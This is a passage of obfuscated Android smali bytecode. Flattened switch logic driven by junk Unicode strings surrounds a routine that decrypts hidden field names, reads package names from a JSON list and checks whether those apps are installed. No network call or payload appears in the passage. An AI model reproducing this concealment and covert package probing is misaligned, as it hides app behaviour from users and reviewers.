    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    goto :goto_a

    :sswitch_1f
    const-string v0, "\u06e7\u06da\u06d7\u06da\u06df\u06d9\u06df\u06e8\u06e4\u06e6\u06d8\u06e6\u06e4\u06e4\u06e0\u06d7\u06e5\u06e0\u06eb\u06dc\u06e2\u06dc\u06e1\u06d8\u06da\u06ec\u06d8\u06ec\u06e4\u06db\u06d8\u06d8\u06ec\u06e0\u06e1\u06e2\u06e4\u06e2\u06e0\u06ec\u06d7\u06d6\u06d8\u06e2\u06ec\u06e8\u06d8\u06e7\u06e0\u06db\u06d7\u06dc\u06d8\u06d8\u06e6\u06ec\u06e8\u06d8"

    goto :goto_8

    :sswitch_20
    const v3, 0x6a7f8627

    const-string v0, "\u06d7\u06df\u06e2\u06da\u06d7\u06e4\u06ec\u06db\u06d6\u06d8\u06e4\u06e2\u06e6\u06e1\u06d7\u06e6\u06d8\u06da\u06e0\u06e6\u06d8\u06e6\u06db\u06e1\u06eb\u06ec\u06e6\u06d8\u06ec\u06e6\u06e8\u06d8\u06e0\u06d7\u06e5\u06d8\u06e2\u06da\u06e2\u06e7\u06db\u06e1\u06d8\u06eb\u06e1\u06ec\u06df\u06e2\u06d8\u06d8\u06d7\u06e8\u06d8\u06d8\u06e4\u06dc\u06e1\u06e8\u06e7\u06e5\u06ec\u06ec\u06da"

    :goto_b
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v3

    sparse-switch v7, :sswitch_data_b

    goto :goto_b

    :sswitch_21
    const-string v0, "\u06d7\u06e5\u06e7\u06e2\u06ec\u06e5\u06e0\u06eb\u06dc\u06da\u06ec\u06d8\u06e8\u06e4\u06e8\u06d8\u06d7\u06d6\u06d8\u06dc\u06ec\u06d6\u06d8\u06d8\u06d6\u06d8\u06d8\u06d9\u06e4\u06e8\u06d9\u06d7\u06d6"

    goto :goto_8

    :cond_4
    const-string v0, "\u06da\u06d8\u06d9\u06dc\u06e7\u06d6\u06e7\u06d8\u06e6\u06e8\u06df\u06d6\u06e0\u06e6\u06e1\u06d8\u06e2\u06e6\u06df\u06e6\u06df\u06e6\u06eb\u06e6\u06e0\u06d6\u06e8\u06e5\u06d8\u06e1\u06dc\u06e1\u06d8\u06e4\u06e8\u06e6\u06d8"

    goto :goto_b

    :sswitch_22
    if-eqz v6, :cond_4

    const-string v0, "\u06d9\u06e8\u06e1\u06e1\u06e5\u06e7\u06d8\u06eb\u06e0\u06e1\u06d8\u06db\u06df\u06d8\u06d8\u06ec\u06e1\u06e7\u06e2\u06e0\u06db\u06e7\u06e4\u06e4\u06e7\u06e5\u06e6\u06d8\u06df\u06da\u06e2\u06e0\u06ec\u06e1\u06d8\u06da\u06eb\u06e6\u06d8\u06d9\u06e4\u06d8\u06e4\u06eb\u06d8\u06e4\u06da\u06e8\u06d8\u06e4\u06d7\u06e0\u06e2\u06eb\u06ec\u06e8\u06dc\u06e0\u06e8\u06dc"

    goto :goto_b

    :sswitch_23
    const-string v0, "\u06e2\u06df\u06e8\u06d8\u06d9\u06ec\u06dc\u06e6\u06e5\u06e8\u06d8\u06e2\u06db\u06e8\u06d8\u06da\u06dc\u06ec\u06d6\u06e1\u06e5\u06d9\u06df\u06d9\u06da\u06e8\u06e0\u06e4\u06e2\u06e5\u06e7\u06eb\u06d7"

    goto :goto_b

    :sswitch_24
    const-string v0, "\u06ec\u06ec\u06e1\u06d8\u06ec\u06e5\u06d8\u06eb\u06e1\u06ec\u06e2\u06ec\u06ec\u06e8\u06ec\u06e1\u06da\u06e8\u06e7\u06d8\u06e2\u06e0\u06d9\u06df\u06e6\u06d7\u06da\u06e4\u06db\u06ec\u06e0\u06e6\u06df\u06d6\u06e0\u06e1\u06dc\u06df"

    goto :goto_8

    :sswitch_25
    :try_start_4
    const-string v0, "\u06e2\u06eb\u06e5\u06e4\u06e4\u06e4\u06e2\u06e0\u06e5\u06da\u06db\u06e0\u06e8\u06e8\u06e8\u06d8\u06e2\u06e4\u06dc\u06d7\u06dc\u06dc\u06d8\u06d7\u06e4\u06ec\u06db\u06da\u06e8\u06d8\u06d9\u06dc\u06e5\u06e6\u06dc\u06d8\u06d6\u06e4\u06df"

    goto :goto_9

    :cond_5
    const-string v0, "\u06d7\u06e8\u06da\u06e5\u06ec\u06e0\u06e1\u06da\u06dc\u06d8\u06d9\u06e8\u06e7\u06d8\u06e4\u06e5\u06e1\u06d8\u06d6\u06db\u06e4\u06e4\u06db\u06e1\u06d7\u06d6\u06e1\u06d8\u06d7\u06e1\u06d6\u06e2\u06e5\u06e6\u06e4\u06d8\u06e1\u06d8\u06e2\u06e2\u06dc"

    goto :goto_a

    :sswitch_26
    const-string v0, "\u06e4\u06dc\u06e7\u06e6\u06e6\u06d9\u06df\u06e6\u06e8\u06d8\u06e8\u06e2\u06d7\u06e4\u06df\u06d6\u06d8\u06d6\u06e2\u06e1\u06e2\u06da\u06db\u06e0\u06e7\u06d8\u06ec\u06d6\u06e5\u06d8\u06e4\u06e5\u06e5\u06d8\u06e0\u06e2\u06ec\u06da\u06e2\u06e1\u06e2\u06df\u06eb\u06da\u06dc\u06e5\u06d8\u06e7\u06e5\u06e1\u06d8\u06e7\u06e7\u06ec"

    goto :goto_a

    :sswitch_27
    const-string v0, "\u06ec\u06d7\u06e4\u06df\u06e0\u06d6\u06d8\u06dc\u06da\u06e2\u06eb\u06e5\u06e4\u06e1\u06ec\u06e6\u06d8\u06df\u06e8\u06e2\u06e4\u06d6\u06e2\u06e1\u06e7\u06e5\u06e0\u06e0\u06dc\u06d8\u06dc\u06da\u06ec\u06dc\u06db\u06e7\u06e7\u06e4\u06d9\u06d9\u06e0\u06d9\u06dc\u06e4\u06ec\u06d9\u06eb\u06d6\u06e4\u06e2\u06d7\u06e4\u06e0\u06d8\u06da\u06db\u06df"

    goto :goto_9

    :sswitch_28
    const-string v0, "\u06df\u06d6\u06e5\u06ec\u06eb\u06e1\u06ec\u06db\u06e7\u06ec\u06dc\u06e4\u06e0\u06e5\u06db\u06ec\u06df\u06e7\u06df\u06e6\u06d8\u06d9\u06e0\u06d8\u06e1\u06ec\u06dc\u06d8\u06e1\u06df\u06eb\u06e5\u06e1\u06df\u06e7\u06e5\u06db\u06dc\u06da\u06e0\u06d7\u06e2\u06dc\u06e2\u06e7\u06e6\u06d6\u06da\u06e0"

    goto :goto_9

    :sswitch_29
    const/4 v0, 0x0

    move v3, v0

    :goto_c
    const v1, -0x518ccaac

    const-string v0, "\u06d9\u06da\u06e2\u06e6\u06ec\u06e1\u06d8\u06e1\u06e1\u06e6\u06d8\u06e5\u06e6\u06d6\u06d8\u06eb\u06df\u06e6\u06d8\u06e6\u06e7\u06dc\u06d8\u06d6\u06d9\u06e5\u06d6\u06e4\u06e4\u06e5\u06e5\u06e6\u06e2\u06e4\u06e5\u06e5\u06df\u06e8\u06d6\u06db\u06db\u06d6\u06e1\u06e6\u06e4\u06e5\u06d7\u06ec\u06e1\u06db\u06e6\u06da"

    :goto_d
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v1

    sparse-switch v7, :sswitch_data_c

    goto :goto_d

    :sswitch_2a
    const-string v0, "\u06e6\u06e1\u06dc\u06db\u06e7\u06d7\u06d9\u06e0\u06d8\u06d9\u06eb\u06e8\u06d8\u06e6\u06d6\u06db\u06e7\u06e1\u06d8\u06eb\u06e4\u06e4\u06e4\u06dc\u06df\u06e7\u06d8\u06d6\u06d8\u06d9\u06e4\u06e1"

    goto :goto_d

    :sswitch_2b
    const-string v0, "\u06d7\u06e1\u06d7\u06e1\u06d8\u06d6\u06d8\u06da\u06d6\u06e6\u06d8\u06df\u06d6\u06eb\u06e5\u06d7\u06eb\u06d7\u06e6\u06dc\u06e0\u06e7\u06e4\u06d6\u06e2\u06e4\u06da\u06e6\u06e4\u06df\u06e7\u06e1\u06e7\u06e4\u06d8\u06e6\u06db\u06dc\u06da\u06e4\u06dc\u06d8\u06e6\u06e0"

    goto :goto_d

    :sswitch_2c
    const v7, -0x56fb3255

    const-string v0, "\u06eb\u06e5\u06e7\u06d8\u06d8\u06d9\u06e4\u06e6\u06d6\u06db\u06dc\u06e7\u06e1\u06d9\u06e4\u06e2\u06e4\u06e2\u06da\u06db\u06d7\u06e8\u06dc\u06db\u06e5\u06d8\u06dc\u06dc\u06d8\u06d8\u06e7\u06d8\u06dc\u06d8\u06ec\u06df\u06e0\u06e8\u06d7\u06e6\u06e2\u06ec\u06d8\u06d8\u06ec\u06e4\u06d7\u06d7\u06e4\u06eb\u06e7\u06da\u06e0"

    :goto_e
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_d

    goto :goto_e

    :sswitch_2d
    const-string v0, "\u06e8\u06e0\u06d8\u06d8\u06d9\u06d9\u06e6\u06d9\u06d9\u06dc\u06d8\u06d8\u06e2\u06e5\u06dc\u06df\u06e5\u06d8\u06d8\u06d7\u06d6\u06e8\u06e0\u06db\u06ec\u06da\u06e5\u06e6\u06d9\u06d8\u06d9\u06e2\u06dc\u06e2\u06e1\u06d8\u06e8\u06db\u06e8\u06d8\u06e4\u06d8\u06eb\u06db\u06ec\u06e8\u06d8\u06db\u06db\u06d6\u06d8\u06da\u06d6\u06d7"

    goto :goto_e

    :cond_6
    const-string v0, "\u06d7\u06d8\u06e5\u06e1\u06e0\u06e7\u06e6\u06e7\u06e0\u06eb\u06e6\u06e1\u06e1\u06e5\u06e1\u06e7\u06eb\u06e5\u06d8\u06db\u06e5\u06da\u06e5\u06e1\u06e0\u06e1\u06e8\u06d8\u06d6\u06e6\u06d6"

    goto :goto_e

    :sswitch_2e
    invoke-virtual {v6}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-ge v3, v0, :cond_6

    const-string v0, "\u06e5\u06e4\u06e5\u06d8\u06e8\u06e5\u06e5\u06d8\u06d8\u06ec\u06e4\u06e4\u06ec\u06e1\u06e0\u06e7\u06d9\u06d9\u06d6\u06d8\u06d8\u06df\u06e5\u06dc\u06d8\u06e8\u06d7\u06e1\u06d8\u06da\u06e5\u06da\u06e0\u06ec\u06dc\u06e6\u06e1\u06df\u06d6\u06d6\u06e4\u06ec\u06e1\u06e5\u06e7\u06ec\u06e5\u06e8\u06e6\u06dc\u06d8\u06db\u06e7\u06d9\u06d9\u06ec\u06df\u06df\u06d6\u06e5"

    goto :goto_e

    :sswitch_2f
    const-string v0, "\u06e0\u06d9\u06ec\u06e6\u06e0\u06e8\u06d8\u06e2\u06d7\u06db\u06d9\u06da\u06e8\u06d8\u06e5\u06e8\u06e8\u06d7\u06df\u06d6\u06e1\u06e6\u06ec\u06e6\u06db\u06e8\u06da\u06d8\u06d8\u06d7\u06e7\u06e4\u06e7\u06e8\u06d7\u06dc\u06e0\u06ec\u06df\u06e4\u06e6\u06df\u06e8\u06e1\u06d8\u06eb\u06e2\u06e8\u06e5\u06ec\u06e0\u06e4\u06e7\u06e1\u06d8\u06d9\u06e8\u06df"

    goto :goto_d

    :sswitch_30
    invoke-virtual {v6, v3}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v1

    const v7, -0x1932029c

    const-string v0, "\u06ec\u06e2\u06d7\u06d8\u06e2\u06e1\u06d8\u06db\u06e0\u06ec\u06e2\u06df\u06d8\u06d8\u06e7\u06e5\u06d9\u06dc\u06e8\u06dc\u06e7\u06e0\u06d6\u06d8\u06eb\u06ec\u06d7\u06e1\u06d9\u06eb\u06df\u06df\u06e8\u06d8\u06da\u06ec\u06dc\u06e0\u06e5\u06e7\u06e1\u06e5\u06e8\u06e6\u06d8\u06df\u06e7\u06e5\u06d8\u06d8\u06ec\u06e5\u06da"

    :goto_f
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_e

    goto :goto_f

    :sswitch_31
    const v8, 0x143a06ea

    const-string v0, "\u06e1\u06e5\u06d6\u06d8\u06e2\u06e7\u06e6\u06d8\u06d7\u06e8\u06e5\u06e5\u06db\u06d6\u06e4\u06e1\u06d8\u06e5\u06e6\u06e0\u06d9\u06e0\u06e5\u06d6\u06e1\u06d8\u06e1\u06e6\u06dc\u06e1\u06e7\u06dc\u06d8\u06e2\u06e1\u06d8\u06d7\u06e0\u06e5\u06d8\u06d8\u06e7\u06e1\u06d8\u06e4\u06e8\u06da"

    :goto_10
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v8

    sparse-switch v9, :sswitch_data_f

    goto :goto_10

    :sswitch_32
    if-nez v1, :cond_7

    const-string v0, "\u06db\u06e8\u06d6\u06d8\u06d8\u06df\u06e0\u06ec\u06e7\u06e6\u06db\u06e5\u06d8\u06d8\u06ec\u06e8\u06d6\u06d8\u06e0\u06e5\u06df\u06dc\u06e5\u06e6\u06d8\u06da\u06d7\u06e0\u06dc\u06d6\u06d8\u06d8\u06e6\u06db\u06e2\u06dc\u06e1\u06e1\u06eb\u06e2\u06d7\u06e7\u06da\u06e0\u06e1\u06e6\u06df\u06e1\u06e6\u06d8\u06db\u06e2\u06da"

    goto :goto_10

    :sswitch_33
    const-string v0, "\u06df\u06d9\u06e7\u06e5\u06e7\u06e1\u06eb\u06d9\u06e1\u06eb\u06e4\u06e6\u06e8\u06e7\u06e8\u06d8\u06e6\u06d9\u06e5\u06d8\u06e6\u06dc\u06d9\u06db\u06d6\u06e5\u06d8\u06e4\u06dc\u06ec\u06d7\u06d6\u06e7\u06d8\u06df\u06e7\u06e7\u06dc\u06e8\u06e5\u06d8\u06e4\u06d8\u06da\u06ec\u06e5\u06d8\u06d8\u06e1\u06da\u06e4\u06db\u06d6"

    goto :goto_f

    :cond_7
    const-string v0, "\u06d8\u06e0\u06eb\u06e0\u06da\u06e6\u06d6\u06eb\u06e7\u06df\u06ec\u06d6\u06e2\u06e0\u06e7\u06e5\u06e8\u06e4\u06da\u06d6\u06da\u06e4\u06da\u06e7\u06e5\u06e2\u06dc\u06e7\u06e8\u06da"

    goto :goto_10

    :sswitch_34
    const-string v0, "\u06e1\u06da\u06e5\u06d8\u06e5\u06db\u06db\u06eb\u06e7\u06d9\u06db\u06e1\u06db\u06e2\u06e2\u06eb\u06ec\u06db\u06e1\u06e8\u06e5\u06da\u06e0\u06e6\u06e1\u06d6\u06e1\u06e5\u06ec\u06da\u06e6\u06d8\u06db\u06d6\u06d9\u06e7\u06e5\u06e6\u06e8\u06e5\u06d8\u06e6\u06d7\u06e5\u06d8"

    goto :goto_10

    :sswitch_35
    const-string v0, "\u06d6\u06e8\u06e4\u06e5\u06df\u06db\u06e7\u06da\u06e1\u06e8\u06d7\u06e4\u06e4\u06db\u06d9\u06d9\u06d7\u06e6\u06e0\u06e2\u06e5\u06e6\u06df\u06e7\u06da\u06db\u06dc\u06d8\u06df\u06dc\u06e6\u06e0\u06db\u06d9\u06e2\u06d8\u06d7\u06eb\u06e1\u06d6\u06d8\u06e2\u06e4\u06dc"
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1

    goto :goto_f

    :sswitch_36
    const-string v0, "\u06d9\u06e0\u06eb\u06e5\u06e4\u06e2\u06da\u06dc\u06db\u06da\u06e6\u06dc\u06d8\u06e4\u06e6\u06e0\u06e0\u06dc\u06e6\u06e1\u06dc\u06d6\u06e8\u06d6\u06e5\u06dc\u06e4\u06dc\u06d8\u06d9\u06e2\u06e0\u06d9\u06dc\u06e6\u06d8"

    goto :goto_f

    :sswitch_37
    :try_start_5
    const-string v0, "b1GsfCo/NZFxUaJy\n"

    const-string v7, "HzDPF0tYUM4=\n"

    invoke-static {v0, v7}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v0, "nj0DR73ZUVyDKBI=\n"

    const-string v8, "+lh3It6tDig=\n"

    invoke-static {v0, v8}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v8, 0x0

    invoke-virtual {v1, v0, v8}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v8

    const-string v0, "YSnZGiFe7m55Osg=\n"

    const-string v9, "AEqtc04wsRo=\n"

    invoke-static {v0, v9}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v9, 0x0

    invoke-virtual {v1, v0, v9}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v9

    const-string v0, "tZ01TRL2Qd8=\n"

    const-string v10, "wfRFEmaTOas=\n"

    invoke-static {v0, v10}, Landroidx/base/연산;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v10, ""

    invoke-virtual {v1, v0, v10}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1

    move-result-object v10

    const/4 v0, 0x0

    :try_start_6
    invoke-virtual {v4, v7, v0}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_6
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_6 .. :try_end_6} :catch_0
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_1

    const/4 v0, 0x1

    :goto_11
    const v11, 0xc93a893

    const-string v1, "\u06dc\u06e5\u06e6\u06d8\u06e4\u06e5\u06e2\u06df\u06e2\u06dc\u06df\u06d8\u06db\u06d9\u06d9\u06dc\u06df\u06ec\u06e1\u06eb\u06e6\u06d8\u06e2\u06e5\u06e4\u06e6\u06e8\u06d6\u06d8\u06e7\u06e1\u06d8\u06e2\u06e4\u06dc\u06d8\u06e7\u06e6\u06e5"

    :goto_12
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_10

    goto :goto_12

    :sswitch_38
    const-string v1, "\u06e7\u06e8\u06e1\u06d8\u06d7\u06db\u06da\u06e1\u06d7\u06dc\u06e0\u06d9\u06e4\u06e4\u06ec\u06ec\u06dc\u06db\u06d6\u06e4\u06e7\u06e4\u06da\u06da\u06dc\u06d8\u06dc\u06d8\u06e6\u06e5\u06dc\u06dc\u06d8\u06e4\u06d9\u06db\u06e2\u06db\u06d9\u06eb\u06e6\u06e5\u06d8\u06e8\u06d8\u06d8\u06d8\u06df\u06e1\u06d8\u06e8\u06e2\u06df\u06dc\u06db\u06ec\u06e7\u06d7\u06e5\u06d8"

    goto :goto_12

    :catch_0
    move-exception v0

    const/4 v0, 0x0

    goto :goto_11

    :sswitch_39
    const-string v1, "\u06d9\u06eb\u06e8\u06db\u06d7\u06e6\u06d8\u06e7\u06eb\u06d6\u06d8\u06d8\u06e8\u06e6\u06e2\u06d9\u06e6\u06d8\u06eb\u06e7\u06e5\u06e4\u06e5\u06e5\u06d8\u06e7\u06e6\u06d8\u06d8\u06d9\u06e2\u06db\u06e4\u06df\u06da\u06e2\u06d7\u06df\u06e6\u06e8\u06e5\u06d8\u06e4\u06eb\u06d8\u06d8\u06e4\u06e2\u06e2"

    goto :goto_12

    :sswitch_3a
    const v12, -0x6f7b197a    # -5.242E-29f

    const-string v1, "\u06d8\u06e2\u06df\u06e4\u06e1\u06d8\u06d8\u06ec\u06e1\u06da\u06dc\u06d8\u06e0\u06e2\u06db\u06e1\u06d9\u06e5\u06df\u06d6\u06e8\u06e2\u06da\u06d8\u06d7\u06e8\u06e7\u06e6\u06d6\u06d8\u06eb\u06da\u06d6\u06dc\u06e1\u06eb\u06dc\u06e6\u06df\u06e5\u06d9\u06e5\u06d8\u06d8\u06e0\u06ec\u06e1\u06d7\u06db\u06d8\u06e6\u06ec\u06e8\u06e4"

    :goto_13
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v12

    sparse-switch v13, :sswitch_data_11

    goto :goto_13

    :sswitch_3b
    const-string v1, "\u06e2\u06eb\u06df\u06e6\u06db\u06e5\u06d8\u06e0\u06e5\u06eb\u06e6\u06db\u06e8\u06e8\u06d6\u06d8\u06e6\u06d8\u06e1\u06d9\u06d8\u06e1\u06d8\u06d7\u06dc\u06d7\u06d7\u06da\u06dc\u06d7\u06d6\u06dc\u06e7\u06df\u06e1\u06df\u06db\u06dc\u06d8\u06e5\u06d9\u06dc\u06e6\u06eb\u06e6\u06e7\u06d9\u06e5\u06d8\u06e5\u06db\u06d8"

    goto :goto_12

    :cond_8
    const-string v1, "\u06dc\u06e6\u06da\u06db\u06e1\u06db\u06e6\u06e0\u06e8\u06d8\u06d9\u06d6\u06e6\u06e6\u06da\u06da\u06e2\u06dc\u06d8\u06e8\u06e2\u06e6\u06d8\u06e2\u06db\u06e7\u06e1\u06e2\u06e6\u06e5\u06ec\u06e1\u06d8\u06e7\u06e5\u06db\u06e5\u06e5\u06d8\u06e0\u06eb\u06e5\u06d8\u06ec\u06df\u06d9\u06ec\u06e0\u06df\u06e6"

    goto :goto_13

    :sswitch_3c
    if-nez v8, :cond_8

    const-string v1, "\u06e4\u06e2\u06eb\u06d6\u06df\u06e2\u06e5\u06da\u06e1\u06d9\u06eb\u06e5\u06e6\u06d8\u06d8\u06d7\u06ec\u06d6\u06d7\u06e1\u06eb\u06e8\u06e6\u06e7\u06e4\u06eb\u06e0\u06dc\u06db\u06d8\u06e4\u06eb\u06d9\u06dc\u06df\u06e5\u06d8\u06df\u06d7\u06e5\u06d8\u06e2\u06d7\u06e1\u06db\u06e4\u06df\u06db\u06dc\u06d8\u06d9\u06d9\u06e2\u06ec\u06d9\u06e1"

    goto :goto_13

    :sswitch_3d
    const-string v1, "\u06da\u06db\u06d8\u06d8\u06e5\u06e6\u06e8\u06d8\u06d6\u06da\u06e2\u06e7\u06e8\u06d6\u06e5\u06d7\u06e8\u06d9\u06d8\u06da\u06e2\u06e8\u06d8\u06e7\u06e8\u06d6\u06dc\u06d7\u06e6\u06d8\u06e0\u06eb\u06d8\u06d8\u06d8\u06e0\u06df\u06d8\u06e0\u06d7\u06df\u06e5\u06e5\u06d8\u06eb\u06db\u06dc\u06d6\u06e5\u06e1\u06d8\u06e0\u06e0\u06eb"

    goto :goto_13

    :sswitch_3e
    const v11, 0x12e25d27

    const-string v1, "\u06ec\u06dc\u06da\u06da\u06e2\u06e7\u06d6\u06eb\u06e8\u06d8\u06e4\u06e8\u06ec\u06d6\u06e4\u06e4\u06dc\u06e5\u06e8\u06d9\u06e8\u06df\u06d7\u06e8\u06e5\u06d8\u06d8\u06da\u06d6\u06d8\u06e2\u06e4\u06e8\u06d6\u06e0\u06d8\u06dc"

    :goto_14
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_12

    goto :goto_14

    :sswitch_3f
    const v11, -0x7da165ee

    const-string v1, "\u06e5\u06e5\u06e5\u06d8\u06ec\u06e8\u06e4\u06e0\u06d9\u06e7\u06df\u06e2\u06e0\u06da\u06d9\u06db\u06e1\u06e7\u06df\u06db\u06e2\u06dc\u06d8\u06e7\u06e2\u06e4\u06d6\u06eb\u06d6\u06d8\u06d7\u06e1\u06e1\u06d8\u06e4\u06d9\u06e5\u06d8\u06d8\u06dc\u06d6\u06d8\u06e6\u06e7\u06e6\u06e6\u06da\u06d6\u06d8"

    :goto_15
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_13

    goto :goto_15

    :sswitch_40
    const v12, -0x605cfb0c

    const-string v1, "\u06ec\u06e2\u06d8\u06e6\u06e1\u06e7\u06d8\u06da\u06eb\u06e1\u06e0\u06e5\u06e6\u06d8\u06e0\u06d7\u06e2\u06d6\u06d7\u06d8\u06e0\u06d6\u06d6\u06d8\u06e5\u06e5\u06e0\u06e7\u06e5\u06e8\u06d8\u06db\u06d7\u06e2\u06db\u06e5\u06ec\u06d7\u06e1\u06dc\u06d8\u06d7\u06e6\u06df\u06e1\u06e1\u06e6\u06d8\u06e8\u06df\u06e2\u06df\u06d6\u06e4\u06dc\u06da\u06e1\u06d8\u06ec\u06e4\u06e7"

    :goto_16
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v12

    sparse-switch v13, :sswitch_data_14

    goto :goto_16

    :sswitch_41
    const-string v1, "\u06d7\u06e4\u06df\u06df\u06e7\u06d6\u06d8\u06da\u06e4\u06e1\u06e1\u06e5\u06dc\u06eb\u06e7\u06e1\u06e0\u06d8\u06eb\u06d7\u06d6\u06e7\u06d8\u06db\u06e1\u06e7\u06d8\u06d8\u06e6\u06d7\u06dc\u06e7\u06d8\u06d8\u06d8\u06dc\u06e6\u06df\u06e6"

    goto :goto_15

    :sswitch_42
    const-string v1, "\u06d7\u06e4\u06d8\u06e2\u06da\u06da\u06e5\u06e7\u06e7\u06e6\u06d8\u06e7\u06e8\u06d7\u06d7\u06db\u06e5\u06d8\u06dc\u06e8\u06db\u06d8\u06e0\u06e2\u06e0\u06eb\u06d8\u06e0\u06d6\u06eb"

    goto :goto_14

    :sswitch_43
    const v12, -0x1a457d5b

    const-string v1, "\u06e2\u06e8\u06d8\u06d6\u06d7\u06e7\u06ec\u06df\u06e7\u06d9\u06e2\u06d8\u06d8\u06d7\u06e1\u06e6\u06d8\u06e1\u06e2\u06e1\u06e1\u06d7\u06da\u06e2\u06e7\u06d8\u06d8\u06d7\u06e0\u06dc\u06d8\u06d6\u06df\u06eb\u06d7\u06eb\u06d9\u06d8\u06d6\u06e1\u06d8\u06e6\u06e4\u06e8\u06d8\u06d7\u06d6\u06e6\u06e6\u06dc\u06d9\u06e7\u06e5\u06d8\u06d8\u06da\u06e8\u06e4\u06e7\u06e0"

    :goto_17
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v13

    xor-int/2addr v13, v12

    sparse-switch v13, :sswitch_data_15

    goto :goto_17

    :sswitch_44
    const-string v1, "\u06da\u06e2\u06e8\u06da\u06d7\u06eb\u06da\u06df\u06e0\u06e0\u06db\u06dc\u06e0\u06d9\u06dc\u06d6\u06e2\u06e8\u06eb\u06da\u06e2\u06d9\u06dc\u06d9\u06db\u06e7\u06eb\u06d6\u06e0\u06eb\u06d7\u06db\u06e8\u06e5\u06e4\u06df\u06e2\u06e0\u06d7\u06d8\u06eb\u06e0\u06db\u06e6\u06d8\u06e5\u06dc\u06e1"

    goto :goto_14

    :cond_9
    const-string v1, "\u06e4\u06e7\u06dc\u06e7\u06db\u06e4\u06e6\u06e0\u06d6\u06d8\u06dc\u06e1\u06d8\u06e1\u06dc\u06d7\u06db\u06d8\u06e8\u06ec\u06eb\u06d8\u06d8\u06ec\u06e2\u06e1\u06d8\u06da\u06e1\u06df\u06d8\u06e7\u06d8"

    goto :goto_17

    :sswitch_45
    if-nez v0, :cond_9

    const-string v1, "\u06eb\u06e6\u06e0\u06d6\u06e2\u06e6\u06e7\u06e1\u06e7\u06e1\u06ec\u06e8\u06e4\u06dc\u06ec\u06e4\u06da\u06e5\u06d8\u06e5\u06db\u06d6\u06d8\u06dc\u06e1\u06d9\u06d8\u06da\u06d6\u06e8\u06da\u06d7\u06e2\u06e6\u06d8\u06e0\u06e4\u06e7\u06e0\u06e4\u06e5\u06e6\u06ec\u06df\u06d7\u06e8\u06d8\u06eb\u06d7\u06e1\u06d8"

    goto :goto_17

    :sswitch_46
    const-string v1, "\u06d9\u06ec\u06e1\u06d8\u06e8\u06db\u06dc\u06e6\u06d9\u06e1\u06d8\u06dc\u06d9\u06e8\u06e7\u06e7\u06d6\u06d8\u06e2\u06e8\u06d8\u06db\u06dc\u06db\u06d6\u06e5\u06d8\u06d9\u06e1\u06d9\u06db\u06ec\u06e8"

    goto :goto_17

    :sswitch_47
    const-string v1, "\u06db\u06e2\u06e8\u06e0\u06e6\u06d7\u06e8\u06e0\u06ec\u06da\u06e6\u06e6\u06d8\u06da\u06df\u06d8\u06d7\u06e5\u06e5\u06d8\u06df\u06d6\u06dc\u06d8\u06e2\u06d8\u06eb\u06d8\u06eb\u06df\u06e4\u06d6\u06e7\u06e6\u06e2\u06d8\u06d8\u06e8\u06ec\u06ec\u06e2\u06eb\u06da\u06df\u06db\u06da"

    goto :goto_14

    :sswitch_48
    const-string v1, "\u06d9\u06db\u06e1\u06d7\u06e8\u06d8\u06db\u06e7\u06dc\u06ec\u06e8\u06da\u06e8\u06e2\u06e8\u06d8\u06e4\u06df\u06e5\u06da\u06e4\u06ec\u06e5\u06e4\u06d6\u06e4\u06e0\u06e5\u06e6\u06da\u06e5\u06d8\u06e1\u06e2\u06d6\u06dc\u06db\u06e8"

    goto :goto_15

    :cond_a
